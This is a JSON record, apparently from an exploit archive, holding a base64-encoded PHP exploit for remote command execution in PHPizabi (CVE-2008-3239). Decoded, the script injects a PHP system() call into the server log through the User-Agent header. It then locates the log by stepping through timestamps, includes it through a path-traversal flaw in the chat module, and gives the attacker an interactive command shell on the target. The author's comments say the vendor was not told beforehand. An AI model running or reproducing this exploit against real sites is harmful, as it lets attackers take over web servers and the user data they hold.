{
    "source": "exploit-database", 
    "exploit": "IyEvdXNyL2Jpbi9waHANCjw/cGhwDQovKiBGb3VuZCB0aGlzIGFmdGVyIGdldHRpbmcgbXkgaW5ldCBiYWNrIGFuZCBub3RpY2luZyB0aGlzIGh0dHA6Ly93d3cubWlsdzBybS5jb20vZXhwbG9pdHMvNjA4NSAuICBUaGUgb25seSBwcm9ibGVtIHdpdGggdGhlIA0KcmVtb3RlIGNvbW1hbmQgZXhlY3V0aW9uIHRoZXJlIGlzIHRoYXQgaXQgYWN0dWFsbHkgcmVxdWlyZXMgcmVnaXN0ZXJfZ2xvYmFscyA9IG9uLiAgSSBzYXcgdGhlIEdMT0JBTCBrZXl3b3JkLCBhbmQgYWN0dWFsbHkgDQpiZWxpZXZlZCB0aGlzIHBvcHVsYXRlZCB0aG9zZSB2YXJpYmxlcyBzb21lIG90aGVyIHdheSBzdWNoIGFzIGNvb2tpZXMgb3Igc29tZXRoaW5nIGllIHJlZ2lzdGVyIGdsb2JhbHMgaXNudCBuZWVkZWQuICANCkFueXdheSwgd2hpbGUgZ2V0dGluZyBiYWNrIGludG8gdGhlIGNvZGUgaSBmb3VuZCBhIG5pY2UgTEZJIGFuZCBwdXQgdGhpcyB0b2dldGhlci4gIFJlbW90ZSBjb21tYW5kIGV4ZWN1YXRpb24gdXNpbmcgYW4gDQpsZmkgYW5kIGxvZyBmaWxlIHBvbGx1dGlvbiB1c2luZyB0aGUgVXNlci1BZ2VudCBzdHJpbmcuICBUaGlzIHdvcmtzIHdpdGggcmVnaXN0ZXJfZ2xvYmFscyA9IG9mZiBhbmQgcGhwIDUuDQoNClRvIHF1b3RlIHBocGl6YWJpIGhvbWVwYWdlIG9uIHRoZSBmaXJzdCBjb21tYW5kIGV4ZWN1dGlvbiBleHBsb2l0Og0KDQpBIHNlY3VyaXR5IHZ1bG5lcmFiaWxpdHkgcmVjZW50bHkgZGlzY292ZXJlZCBpbiBQSFBpemFiaSBvcmlnaW5hbGx5IHJlcG9ydGVkIGJ5IGEgbG9jYWwgYWRtaW5pc3RyYXRvciBoYXMgYmVlbiBjb25maXJtZWQgYW5kIHB1Ymxpc2hlZCBieSB0aGUgTmF0aW9uYWwgVnVsbmVyYWJpbGl0eSBEYXRhYmFzZSBzZXJ2aWNlIG9mIHRoZSBOYXRpb25hbCBJbnN0aXR1dGUgb2YgU3RhbmRhcmRzIGFuZCBUZWNobm9sb2d5IChOSVNUKSBhbmQgdGhlIERIUyBOYXRpb25hbCBDeWJlciBTZWN1cml0eSBEaXZpc2lvbiAoVVMtQ0VSVCkgaW4gdGhlIE5hdGlvbmFsIEN5YmVyLUFsZXJ0IENWRS0yMDA4LTMyMzkgLiBEdWUgdG8gdGhlIGdyZWF0IHZpc2liaWxpdHkgb2YgdGhlIE5WRC9OSVNUIHBvcnRhbCB3aGljaCBkaXNjbG9zZWQgdGhpcyBpbmZvcm1hdGlvbiwgdGhlcmUgaGF2ZSBiZWVuIGEgbnVtYmVyIG9mIGF0dGFja3MgYWdhaW5zdCBQSFBpemFiaSB3ZWJzaXRlcy4NClRvdWdoIHdlIGRvIG5vdCBpbnRlbmQgdG8gcmVsZWFzZSBhIHNlY3VyaXR5IGZpeCBmb3IgdGhpcyBpc3N1ZSBhdCB0aGlzIHRpbWUsIHdlIHdhbnQgdG8gcmVtaW5kIG91ciB1c2VycyBvZiB0aGUgaW1wb3J0YW5jZSBvZiBkaXNhYmxpbmcgdGhlICJSRUdJU1RFUl9HTE9CQUxTIiBvcHRpb24gb2YgdGhlaXIgc3lzdGVtLiBUaGlzIG9wdGlvbiB3aWxsIG5vdCBvbmx5IGVuYWJsZSB0aGlzIHZ1bG5lcmFiaWxpdHkgdG8gYmUgZXhwbG9pdGVkIGJ1dCB3aWxsIGFsc28gb3BlbiBtdWx0aXBsZSBicmVhY2hlcyBpbnRvIHlvdXIgc3lzdGVtLiBOb3RlIHRoYXQgaWYgeW91ciBzeXN0ZW0gaXMgY29uZmlndXJlZCBwcm9wZXJseSAod2l0aCAiUkVHSVNURVJfR0xPQkFMUyIgZGlzYWJsZWQpLCB0aGlzIHZ1bG5lcmFiaWxpdHkgZG9lcyBub3QgYXBwbHkgdG8geW91ciB3ZWJzaXRlLg0KUGxlYXNlIHJlYWQgdGhyb3VnaCB0aGUgZG9jdW1lbnRhdGlvbiBhdCBQSFAuTmV0IHRvIGNoZWNrIGlmIHlvdXIgc3lzdGVtIGlzIGNvbmZpZ3VyZWQgcHJvcGVybHkuIENvbnRhY3QgeW91ciBzeXN0ZW0gYWRtaW5pc3RyYXRvciB0byB0YWtlIGFwcHJvcHJpYXRlIGFjdGlvbnMgaW4gb3JkZXIgdG8gdm9pZCB0aGlzIHZ1bG5lcmFiaWxpdHkgaWYgeW91ciBzeXN0ZW0gaGFzIHRoZSAiUkVHSVNURVJfR0xPQkFMUyIgb3B0aW9uIGVuYWJsZWQuDQpUaGlzIHZ1bG5lcmFiaWxpdHkgYWZmZWN0cyBhbGwgdmVyc2lvbnMgb2YgUEhQaXphYmkgMC44IHRvIEhGUDMgU0YxIChpbmNsdWRlZCkuIFRoZXJlIGlzIG5vIHNlY3VyaXR5IGZpeCBwYWNrIHJlbGVhc2UgcGxhbm5lZCBhdCB0aGlzIHRpbWUuDQoNCkZ1bm55IHRob3NlIGd1eXMgbmV2ZXIgZXZlbiByZXNwb25kZWQgdG8gb3IgYWNrbm93bGVkZ2VkIG15IGRhdGFiYXNlIGluZm9ybWF0aW9uIGRpc2Nsb3N1cmUgZnJvbSBoZXJlOiANCmh0dHA6Ly93d3cubWlsdzBybS5jb20vZXhwbG9pdHMvNTUwNiB3aGljaCBpcyBqdXN0IGFzIHNlcmlvdXMgSU1PIGFzIGNvbW1hbmQgZXhlY3V0aW9uLCBiZWNhdXNlIGFueW9uZSBnb29kIHdpbGwgZ2V0IHRoZXJlIGFueXdheSA7KS4NCkFueXdheSwgdGltZSB0byB0b3RhbGx5IGRlc3Ryb3kgdGhlaXIgaG9wZXMgb2YgYW4gZWFzeSAiY3V0IG9mZiByZWdpc3Rlcl9nbG9iYWxzIiBmaXguICBXYW50ZWQgdG8gYWRkIGkgZGlkIE5PVCANCmxldCB0aGUgdmVuZG9yIGtub3cgb2YgdGhpcyBvbmUgYmVmb3JlIGhhbmQsIGxhc3QgdGltZSBpIGdhdmUgdGhlbSA0OCsgaG91cnMgYW5kIHN0aWxsIHRvIHRoaXMgZGF5IGhhdmVudCByZWNpZXZlZCANCmV2ZW4gYSByZXNwb25zZSBmcm9tIHRoZW0uICBJZiBpIGhhdmUgdGhlIHRpbWUgdG8gd2FzdGUgbG9vayBmb3IgYSBjIHBvcnQgdG8gdGhpcyBzb29uLiAgTXkgQyBpcyBiYWQgPS8uICAqLw0KDQojdnVsbmVyYWJsZSBjb2RlICAgbW9kdWxlcy9jaGF0L2RhYy5waHANCiMNCiMJZnVuY3Rpb24gaGFuZGxlU2VuZENoYXREYXRhKCRkYXRhKSB7DQojCQlpZiAoc3Vic3RyKCRkYXRhLCAwLCAxKSA9PSAiLyIpIHJldHVybiAkdGhpcyAtPiBoYW5kbGVDaGF0Q29tbWFuZCgkZGF0YSwgJHRoaXMgLT4gY2hhbm5lbCk7ICAgICAjIFRoaXMgbGluZSByaWdodCBoZXJlIHNheXMgaWYgdGhlIHN0cmluZw0KIwkJCQkJCQkJCQkJCQkJIyBiZWdpbnMgd2l0aCAvIGl0IGlzIGEgY29tbWFuZCBzbyB0cmVhdA0KIwkJCQkJCQkJCQkJCQkJIyBhcyBvbmUgYW5kIGNhbGwgaGFuZGxlQ2hhdENvbW1hbmQNCiMNCiMNCiMNCiMgICAgICAgZnVuY3Rpb24gaGFuZGxlQ2hhdENvbW1hbmQoJGRhdGEsICRjaGFubmVsKSB7DQojCQkJLyogLyEgaXMgYSBjYWxsIHRvIHRoZSBsYXN0IGNhbGxlZCBjb21tYW5kIC4uLiBoYW5kbGUgaXQgKi8NCiMJCQlpZiAoc3Vic3RyKCRkYXRhLCAxLCAxKSA9PSAiISIgYW5kIGlzc2V0KCRfU0VTU0lPTlsidHJpdG9uIl1bImxhc3Rjb21tYW5kIl0pKQ0KIwkJCQkkZGF0YSA9ICRfU0VTU0lPTlsidHJpdG9uIl1bImxhc3Rjb21tYW5kIl07DQojDQojCQkJLyogQ29udmVydCBpbGxlZ2FsIGNoYXJhY3RlciBlbnRpdGllcyAqLw0KIwkJCSRlbnRpdGllcyA9IGFycmF5KCI7Ij0+IiYjMDU5OyIsICJcIiI9PiImcXVvdDsiLCAiJyI9PiImIzAzOTsiLCAiPCI9PiImbHQ7IiwgIj4iPT4iJmd0OyIsICJcXCI9PiImIzA5MjsiLCAiXiI9PiImIzA5NDsiKTsNCiMJCQkkZGF0YSA9IHN0cnRyKHN0cmlwc2xhc2hlcygkZGF0YSksICRlbnRpdGllcyk7DQojDQojCQkJJGNvbW1hbmRBcmdzID0gZXhwbG9kZSgiICIsIHN1YnN0cigkZGF0YSwgMSkpOyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBjb21tYW5kQXJncyBpcyBzZXQgdXNpbmcgZGF0YSB3aGljaCBoYXNudCBzYW5pdGl6ZWQuDQojCQkJaWYgKGlzX2ZpbGUoImNvbW1hbmRzLyIuJGNvbW1hbmRBcmdzWzBdLiIucGhwIikgYW5kIEBpbmNsdWRlKCJjb21tYW5kcy8iLiRjb21tYW5kQXJnc1swXS4iLnBocCIpKSB7ICAgICAgICAgIyBjb21tYW5kcyBhcmUgc3RvcmVkIGluIHRoZWlyIG93biBmaWxlcyBhbmQgaW5jbHVkZWQgZWFjaCBjYWxsIHRvIHRoZW0uDQojCQkJCSRfU0VTU0lPTlsidHJpdG9uIl1bImxhc3Rjb21tYW5kIl0gPSAkZGF0YTsNCiMJCQkJdF9jb21tYW5kOjpydW5Db21tYW5kKCRjb21tYW5kQXJncywgJGNoYW5uZWwpOw0KIwkJCX0NCiMJCQllbHNlICR0aGlzIC0+IGxvY2FsRWNobygnRVJSX05PQ09NTUFORCcsIGFycmF5KCRjb21tYW5kQXJnc1swXSkpOw0KIwkJfSAqLw0KIw0KIw0KIwlTbyB0aGUgbGZpIHdvcmtzIGJ5IGNhbGxpbmcgUEFUSC9tb2R1bGVzL2NoYXQvZGFjLnBocD9zZW5kQ2hhdERhdGE9Ly4uLy4uLy4uL1BBVEhUT0ZJTEVUT0lOQ0xVREVcMA0KIwlzaW5jZSBwaHBpemFiaSBzdHJpcHMgaW1hZ2VzIG9mIGFsbCBjb21tZW50cyB3aGVuIHVwbG9hZGVkLCBoYWQgdG8gZ2V0IGNyZWF0aXZlIHRvIGdldCB0aGlzIHRvIHdvcmsgOikNCiMJaSBoYW5kbGVkIHRoaXMgYnkgbm90aWNpbmcgdGhhdCBwaHBpemFiaSBsb2dzIHRoZSB1c2VyLWFnZW50IG9mIGVhY2ggcmVxdWVzdCBpbiBQQVRIL3N5c3RlbS9jYWNoZS9sb2dzLg0KIwlUaGF0IG1lYW5zIGJ5IHNwZWNpZnlpbmcgYSB1c2VyLWFnZW50IHdpdGggcGhwdGFncyBpbiBpdCBpIGNhbiBnZXQgbXkgbGZpIHRvIHdvcmsgbmljZWx5Lg0KIwlUaGUgb25seSBwcm9ibGVtIGlzIHRoYXQgdGhvc2UgbG9nIGZpbGVzIGFyZSBuYW1lZCBiYXNlZCBvbiBhIHVuaXggdGltZXN0YW1wLCBhbmQgdGhleSB1cGRhdGUgZXZlcnkgMjQgaG91cnMuDQojCVRvIGRlYWwgd2l0aCB0aGlzLCBhIHJlcXVlc3QgaXMgbWFkZSB0byB0aGUgc2VydmVyIHRvIGdldCB0aGUgRGF0ZTogaGVhZGVyIHJlc3BvbnNlLCBhbmQgdGhpcyBpcyBjb252ZXJ0ZWQgdG8NCiMJYSB1bml4IHRpbWVzdGFtcCwgYW5kIHRoZW4gaXQgaXMgd2Fsa2VkIGJ5IHRoZSBob3VyIDM2IGhvdXJzIGJhY2ssIHRoZW4gMzYgaG91cnMgZm9yd2FyZCBvbmUgaG91ciBhdCBhIHRpbWUuDQojCXRoZSBwaHBjb2RlIGVjaG9zIGEgc3RyaW5nIHdoZW4geW91IGhhdmUgaGl0IHRoZSBwcm9wZXIgbG9nIGZpbGUsIHRoaXMgdGVsbHMgdXMgdGhhdCBpdCBoYXMgZm91bmQgd2hhdCBpcyBuZWVkZWQuDQojDQojCUkgYW0gbm90IHJlc3BvbnNpYmxlIGZvciB0aGUgdXNlIG9mIHRoaXMgY29kZSBpbiBhbnkgd2F5IHNoYXBlIG9yIGZvcm0uICBXaGF0ZXZlciB5b3UgY2hvb3NlIHRvIGRvDQojCXdpdGggaXQgaXMgb24geW91LiBFbmpveSA6KQ0KIw0KIwljb21tZW50cywgY3JpdGljaXNtIHNob3VsZCBiZSBlbWFpbGVkIHRvIGljb2RlMDBAZ21haWwuY29tIC4gICBHb3QgcHJvYmxlbXM/IEVtYWlsIHRoZW0gdG8gaWNvZGUwMEBnbWFpbC5jb20gYnV0IGRvbnQgZXhwZWN0IGEgcmVzcG9uc2UuIDspDQoNCg0KZnVuY3Rpb24gdXNhZ2UoKQ0Kew0KCSR1c2FnZT0iX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19cblxuIjsNCgkkdXNhZ2UuPSIJUEhQaXphYmkgdjAuODQ4YiBDMSBIRlAxLTMgUmVtb3RlIENvbW1hbmQgRXhlY3V0aW9uIAkgIFxuIjsNCgkkdXNhZ2UuPSIJCWJ5IHlvdWNvZGUJaWNvZGUwMEBnbWFpbC5jb20JCSAgXG4iOw0KCSR1c2FnZS49Il9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXG4iOw0KCSR1c2FnZS49IlVzYWdlOiBcblxuIjsNCgkkdXNhZ2UuPWJhc2VuYW1lKCRfU0VSVkVSWydQSFBfU0VMRiddKS4iIEhPU1QgUEFUSCAgXG5cbiI7DQoJJHVzYWdlLj0iCUhPU1QJCXJlbW90ZSBob3N0XG4iOw0KCSR1c2FnZS49IglQQVRICQlwYXRoIHRvIHBocGl6YWJpXG4iOw0KCWRpZSgkdXNhZ2UpOw0KfQ0KDQpmdW5jdGlvbiB0aW1lc3RhbXBTdHIoJGhvc3QsJHBhdGgsJHBvcnQ9ODApDQp7DQoJJHBhY2tldD0iR0VUICIuJHBhdGguImluZGV4LnBocCBIVFRQLzEuMFxyXG4iOw0KCSRwYWNrZXQuPSJVc2VyLUFnZW50OiBwaHBpbmogMC4xIDw/cGhwIGlmKCFpc3NldChcJF9HRVRbJ3h5eiddKSlkaWUoXCJGaW5kVGhpc1RhZy05MjAzODQyMzk4XCIpO3N5c3RlbShcJF9HRVRbJ3h5eiddKTtkaWUoKTsgPz5cclxuIjsNCglpZig4MD09JHBvcnQpDQoJew0KCQkkcGFja2V0Lj0iSG9zdDogIi4kaG9zdC4iXHJcbiI7DQoJfWVsc2V7DQoJCSRwYWNrZXQuPSJIb3N0OiAiLiRob3N0LiI6Ii4kcG9ydC4iXHJcbiI7DQoJfQ0KCSRwYWNrZXQuPSJDb25uZWN0aW9uOiBDbG9zZVxyXG5cclxuIjsNCgkkdG1waG9zdGFycj1nZXRob3N0YnluYW1lbCgkaG9zdCk7DQoJaWYoJHRtcGhvc3RhcnI9PT1GQUxTRSkNCgl7DQoJCWRpZSgiRmFpbGVkIHRvIHJlc29sdmUgaG9zdG5hbWUgJGhvc3QuXG4iKTsNCgl9DQoJJHBhY2tldHNlbnQ9MDsNCglmb3JlYWNoICgkdG1waG9zdGFyciBhcyAkaG9zdCkNCgl7DQoJCSRvY2s9ZnNvY2tvcGVuKCRob3N0LCRwb3J0KTsNCgkJaWYoISRvY2spDQoJCXsNCgkJCWZjbG9zZSgkb2NrKTsNCgkJCWNvbnRpbnVlOw0KCQl9DQoJCWZwdXRzKCRvY2ssJHBhY2tldCk7DQoJCSRwYWNrZXRzZW50PTE7DQoJCSRyZXNwb25zZT0iIjsNCgkJd2hpbGUgKCFmZW9mKCRvY2spKQ0KCQl7DQoJCQkkcmVzcG9uc2UuPWZnZXRzKCRvY2spOw0KCQl9DQoJCWZjbG9zZSgkb2NrKTsNCgkJaWYoJHBhY2tldHNlbnQpDQoJCQlicmVhazsNCgl9DQoJaWYoISRwYWNrZXRzZW50KQ0KCQlkaWUoIkZhaWxlZCB0byBjb25uZWN0IHRvICRob3N0LlxuRXJyb3I6ICIuc29ja2V0X3N0cmVycm9yKHNvY2tldF9sYXN0X2Vycm9yKCRvY2spKS4iXG4iKTsNCgkkZGF0ZVBvcz1zdHJwb3MoJHJlc3BvbnNlLCJEYXRlOiIpOw0KCSRkYXRlUG9zKz02Ow0KCSR0bXBicmVha1Bvcz1zdHJwb3MoJHJlc3BvbnNlLCJcclxuIiwkZGF0ZVBvcyk7DQoJJGJyZWFrUG9zPSR0bXBicmVha1Bvcy0kZGF0ZVBvczsNCgkkZGF0ZVN0cj1zdWJzdHIoJHJlc3BvbnNlLCRkYXRlUG9zLCRicmVha1Bvcyk7DQoJJGRhdGVBcnI9ZXhwbG9kZSgiICIsJGRhdGVTdHIpOw0KCSRtb250aHMgPSBhcnJheSAoICJKYW4iID0+IDEsICJGZWIiID0+IDIsICJNYXIiID0+IDMsICJBcHIiID0+IDQsICJNYXkiID0+IDUsICJKdW4iID0+IDYsICJKdWwiID0+IDcsICJBdWciID0+IDgsICJTZXAiID0+IDksICJPY3QiID0+IDEwLCAiTm92IiA9PiAxMSwgIkRlYyIgPT4gMTIgKTsNCglmb3JlYWNoKCRtb250aHMgYXMgJGtleSA9PiAkdmFsKXsNCgkJaWYoc3RyaXBvcygkZGF0ZUFyclsyXSwka2V5KSE9PUZBTFNFKQ0KCQkJJG1vbnRoTnVtYmVyPSR2YWw7DQoJfQ0KCSR0bXBob3VyQXJyPWV4cGxvZGUoIjoiLCRkYXRlU3RyKTsNCglpZihpc19hcnJheSgkdG1waG91ckFycikpDQoJew0KCQkkaG91cj1zdWJzdHIoJHRtcGhvdXJBcnJbMF0sLTIsMik7DQoJCSR0aW1lc3RhbXBTdHI9bWt0aW1lKCRob3VyLDAsMCwkbW9udGhOdW1iZXIsJGRhdGVBcnJbMV0sJGRhdGVBcnJbM10pOw0KCX1lbHNlew0KCQkkdGltZXN0YW1wU3RyPW1rdGltZSgpOw0KCX0NCglyZXR1cm4gJHRpbWVzdGFtcFN0cjsNCn0NCg0KZnVuY3Rpb24gZmluZGZpbGVuYW1lKCRob3N0LCRwYXRoLCRzdGFydCwkbW9kZT0wLCRwb3J0PTgwKQ0Kew0KCSRkYXRlPSRzdGFydDsNCgkkZm91bmR0YWc9MDsNCgkkdG1waG9zdGFycj1nZXRob3N0YnluYW1lbCgkaG9zdCk7DQoJaWYoJHRtcGhvc3RhcnI9PT1GQUxTRSkNCgl7DQoJCWRpZSgiRmFpbGVkIHRvIHJlc29sdmUgaG9zdG5hbWUgJGhvc3QuXG4iKTsNCgl9DQoJZm9yKCRpPTA7JGk8PTM2OyRpKyspDQoJew0KCQkkcGFja2V0PSJHRVQgIi4kcGF0aC4ibW9kdWxlcy9jaGF0L2RhYy5waHA/c2VuZENoYXREYXRhPS8uLi8uLi8uLi9zeXN0ZW0vY2FjaGUvbG9ncy8iLiRkYXRlLiIubG9nXFwwIEhUVFAvMS4wXHJcbiI7DQoJCSRwYWNrZXQuPSJVc2VyLUFnZW50OiBNb3ppbGxhLzQuMCAoY29tcGF0aWJsZTsgTVNJRSA2LjA7IFdpbmRvd3MgTlQgNS4xKVxyXG4iOw0KCQlpZig4MD09JHBvcnQpDQoJCXsNCgkJCSRwYWNrZXQuPSJIb3N0OiAiLiRob3N0LiJcclxuIjsNCgkJfWVsc2V7DQoJCQkkcGFja2V0Lj0iSG9zdDogIi4kaG9zdC4iOiIuJHBvcnQuIlxyXG4iOw0KCQl9DQoJCSRwYWNrZXQuPSJDb25uZWN0aW9uOiBDbG9zZVxyXG5cclxuIjsNCgkJJHBhY2tldHNlbnQ9MDsNCgkJZm9yZWFjaCAoJHRtcGhvc3RhcnIgYXMgJHJlbW90ZWhvc3QpDQoJCXsNCgkJCSRvY2s9ZnNvY2tvcGVuKCRyZW1vdGVob3N0LCRwb3J0KTsNCgkJCWlmKCEkb2NrKQ0KCQkJew0KCQkJCWZjbG9zZSgkb2NrKTsNCgkJCQljb250aW51ZTsNCgkJCX0NCgkJCWZwdXRzKCRvY2ssJHBhY2tldCk7DQoJCQkkcGFja2V0c2VudD0xOw0KCQkJJHJlc3BvbnNlPSIiOw0KCQkJd2hpbGUgKCFmZW9mKCRvY2spKQ0KCQkJew0KCQkJCSRyZXNwb25zZS49ZmdldHMoJG9jayk7DQoJCQl9DQoJCQlmY2xvc2UoJG9jayk7DQoJCQlpZigkcGFja2V0c2VudCkNCgkJCQlicmVhazsNCgkJfQ0KCQlpZighJHBhY2tldHNlbnQpDQoJCQlkaWUoIkZhaWxlZCB0byBjb25uZWN0IHRvICRob3N0LlxuRXJyb3I6ICIuc29ja2V0X3N0cmVycm9yKHNvY2tldF9sYXN0X2Vycm9yKCRvY2spKS4iXG4iKTsNCgkJaWYoKHN0cnBvcygkcmVzcG9uc2UsIkZpbmRUaGlzVGFnLTkyMDM4NDIzOTgiKSkhPT1GQUxTRSkNCgkJew0KCQkJJGZvdW5kdGFnPTE7DQoJCQlicmVhazsNCgkJfQ0KCQlpZigkbW9kZT09MCkNCgkJew0KCQkJJGRhdGUtPTM2MDA7DQoJCX1lbHNlew0KCQkJJGRhdGUrPTM2MDA7DQoJCX0NCgl9DQoJaWYoJGZvdW5kdGFnKQ0KCXsNCgkJcmV0dXJuICRkYXRlOw0KCX1lbHNlew0KCQlyZXR1cm4gRkFMU0U7DQoJfQ0KfQ0KDQoNCmlmKCRhcmdjIDwgMykNCgl1c2FnZSgpOw0KJGhvc3RzdHJpbmc9JGFyZ3ZbMV07DQokcGF0aD0kYXJndlsyXTsNCiRkYXRlPXRpbWVzdGFtcFN0cigkaG9zdHN0cmluZywkcGF0aCk7DQplY2hvICJ0aW1lc3RhbXAgaXMgJGRhdGUuICBVc2luZyB0aGlzIGFzIHN0YXJ0IHBvaW50IGFuZCBhdHRlbXB0aW5nIHRvIGxvY2F0ZSBsb2cgZmlsZS5cbiI7DQokcmVtb3RlbG9nPWZpbmRmaWxlbmFtZSgkaG9zdHN0cmluZywkcGF0aCwkZGF0ZSk7DQppZighJHJlbW90ZWxvZykNCgkkcmVtb3RlbG9nPWZpbmRmaWxlbmFtZSgkaG9zdHN0cmluZywkcGF0aCwkZGF0ZSwxKTsNCmlmKCEkcmVtb3RlbG9nKQ0KCWRpZSgiRmFpbGVkIHRvIGZpbmQgdGhlIGxvZyBmaWxlIG5hbWUuICBDYW50IGluY2x1ZGUgYSBmaWxlIHRoYXQgY2FudCBiZSBmb3VuZCA6KFxuIik7DQplY2hvICJGb3VuZCBsb2cgZmlsZTogJHJlbW90ZWxvZy5sb2dcbkJlZ2lubmluZyBjb21tYW5kIGV4ZWN1dGlvbi4gLiAuXG4iOw0KJHRtcHBvcnRhcnI9ZXhwbG9kZSgiOiIsJGhvc3RzdHJpbmcpOw0KaWYoaXNzZXQoJHRtcHBvcnRhcnJbMV0pKQ0Kew0KCSRob3N0c3RyaW5nPSR0bXBwb3J0YXJyWzBdOw0KCSRyZW1vdGVwb3J0PSR0bXBwb3J0YXJyWzFdOw0KfWVsc2V7DQoJJHJlbW90ZXBvcnQ9ODA7DQp9DQokdG1waG9zdGFycj1nZXRob3N0YnluYW1lbCgkaG9zdHN0cmluZyk7DQppZigkdG1waG9zdGFycj09PUZBTFNFKQ0Kew0KCWRpZSgiRmFpbGVkIHRvIHJlc29sdmUgaG9zdG5hbWUgJGhvc3RzdHJpbmcuXG4iKTsNCn0NCmZvcig7OykNCnsNCgllY2hvICIjPiAiOw0KCSRjbWQ9dXJsZW5jb2RlKGZnZXRzKFNURElOKSk7DQoJJHBhY2tldD0iR0VUICIuJHBhdGguIm1vZHVsZXMvY2hhdC9kYWMucGhwP3NlbmRDaGF0RGF0YT0vLi4vLi4vLi4vc3lzdGVtL2NhY2hlL2xvZ3MvIi4kcmVtb3RlbG9nLiIubG9nXFwwJnh5ej0iLiRjbWQuIiBIVFRQLzEuMFxyXG4iOw0KCSRwYWNrZXQuPSJVc2VyLUFnZW50OiBNb3ppbGxhLzQuMCAoY29tcGF0aWJsZTsgTVNJRSA2LjA7IFdpbmRvd3MgTlQgNS4xKVxyXG4iOw0KCWlmKDgwPT0kcmVtb3RlcG9ydCkNCgl7DQoJCSRwYWNrZXQuPSJIb3N0OiAiLiRob3N0c3RyaW5nLiJcclxuIjsNCgl9ZWxzZXsNCgkJJHBhY2tldC49Ikhvc3Q6ICIuJGhvc3RzdHJpbmcuIjoiLiRyZW1vdGVwb3J0LiJcclxuIjsNCgl9DQoJJHBhY2tldC49IkNvbm5lY3Rpb246IENsb3NlXHJcblxyXG4iOw0KCSRwYWNrZXRzZW50PTA7DQoJZm9yZWFjaCAoJHRtcGhvc3RhcnIgYXMgJHJlbW90ZWhvc3QpDQoJew0KCQkkb2NrPWZzb2Nrb3BlbigkcmVtb3RlaG9zdCwkcmVtb3RlcG9ydCk7DQoJCWlmKCEkb2NrKQ0KCQl7DQoJCQlmY2xvc2UoJG9jayk7DQoJCQljb250aW51ZTsNCgkJfQ0KCQlmcHV0cygkb2NrLCRwYWNrZXQpOw0KCQkkcGFja2V0c2VudD0xOw0KCQkkcmVzcG9uc2U9IiI7DQoJCXdoaWxlICghZmVvZigkb2NrKSkNCgkJew0KCQkJJHJlc3BvbnNlLj1mZ2V0cygkb2NrKTsNCgkJfQ0KCQlmY2xvc2UoJG9jayk7DQoJCWlmKCRwYWNrZXRzZW50KQ0KCQkJYnJlYWs7DQoJfQ0KCWlmKCEkcGFja2V0c2VudCkNCgl7DQoJCWVjaG8gIkZhaWxlZCB0byBjb25uZWN0IHRvICRob3N0c3RyaW5nLlxuRXJyb3I6ICIuc29ja2V0X3N0cmVycm9yKHNvY2tldF9sYXN0X2Vycm9yKCRvY2spKS4iXG4iOw0KCQlicmVhazsNCgl9DQoJJGNtZE91dHB1dD1zdHJzdHIoJHJlc3BvbnNlLCJwaHBpbmogMC4xICIpOw0KCSRjbWRPdXRwdXQ9c3RyX3JlcGxhY2UoInBocGluaiAwLjEgIiwiIiwkY21kT3V0cHV0KTsNCgllY2hvICJcblxuJGNtZE91dHB1dFxuXG4iOw0KfQ0KDQo/Pg0KDQojIG1pbHcwcm0uY29tIFsyMDA5LTAzLTIzXQ==", 
    "filename": "platforms/php/webapps/8268.php", 
    "id": "8268", 
    "cves": [
        "CVE-2008-3239"
    ]
}